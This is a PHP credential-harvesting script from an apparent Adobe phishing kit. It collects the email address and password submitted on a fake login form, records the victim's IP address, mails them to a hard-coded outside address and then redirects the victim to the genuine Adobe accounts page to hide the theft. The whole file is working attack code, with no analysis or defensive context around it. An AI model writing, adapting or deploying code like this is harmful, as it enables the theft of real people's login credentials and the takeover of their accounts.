<?php

$ip = getenv("REMOTE_ADDR");
$message .= "------------------ Adobe Rezults --------------\n";
$message .= "Email ID:       ".$_POST['email']."\n";
$message .= "Password:     " .$_POST['password']."\n";
$message .= "IP: ".$ip."\n";
$message .= "----------------- Danda1 de slimmoney --------------\n";


$recipient ="marklionna@gbmail.com";

$subject = "kingin Results!";
$headers = "From: HackerDre";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
$arr=array($recipient);
foreach ($arr as $recipient){$carcabot = mail($recipient,$subject,$message,$headers);}
if ($carcabot)
       {
           header("Location: https://accounts.adobe.com/");

       }
else
           {
         echo "ERROR! Please go back and try again.";
         }

?> 